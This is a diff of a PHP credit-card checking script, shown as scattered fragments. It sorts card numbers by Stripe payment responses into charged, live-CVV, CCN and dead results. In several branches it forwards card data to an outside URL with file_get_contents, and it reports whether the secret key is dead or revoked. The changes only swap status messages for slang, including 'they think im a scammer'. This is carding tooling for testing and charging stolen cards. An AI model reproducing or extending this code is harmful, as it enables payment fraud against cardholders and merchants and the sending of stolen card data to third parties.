@@ -143,7 +143,7 @@ if(strpos($result2, '"seller_message": "Payment complete."' )) {
     echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.' 𝔠𝔥𝔞𝔯𝔤𝔢𝔡 𝔟𝔶 @balenottere<br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
 }
 elseif(strpos($result2,'"cvc_check": "pass"')){
-    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 𝗰𝘃𝘃 𝗹𝗶𝘃𝗲</span><br>';
 }
 
 
@@ -167,17 +167,17 @@ elseif(strpos($resul2, "do_not_honor" )) {
     echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
 }
 elseif(strpos($result,"fraudulent")){
-    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: they think im a scammer</span><br>';
 
 }
 
 elseif(strpos($result2,'"code": "incorrect_cvc"')){
     file_get_contents($forwardccn);
-    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
+    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: cvc wrong</span><br>';
 }
 elseif(strpos($result1,' "code": "invalid_cvc"')){
     file_get_contents($forwardccn);
-    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
+    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: cvc wrong</span><br>';
      
 }
 elseif(strpos($result1,"invalid_expiry_month")){
@@ -209,7 +209,7 @@ elseif(strpos($result2, "stolen_card" )) {
 
 }
 elseif(strpos($result2, "transaction_not_allowed" )) {
-    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: TRANSACTION NOT ALLOWED</span><br>';
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: bro dont allowed the transaction</span><br>';
     }
     elseif(strpos($result2, "authentication_required")) {
     echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
@@ -323,10 +323,10 @@ elseif(strpos($result2, "fraudulent" )) {
     echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';
 }
 elseif(strpos($result1, "testmode_charges_only" )) {
-    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK KEY DEAD OR INVALID</span><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: sk ded or invalid</span><br>';
 }
 elseif(strpos($result1, "api_key_expired" )) {
-    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK KEY REVOKED</span><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: sk ded</span><br>';
 }
 elseif(strpos($result1, "parameter_invalid_empty" )) {
     echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: ENTER CC TO CHECK</span><br>';
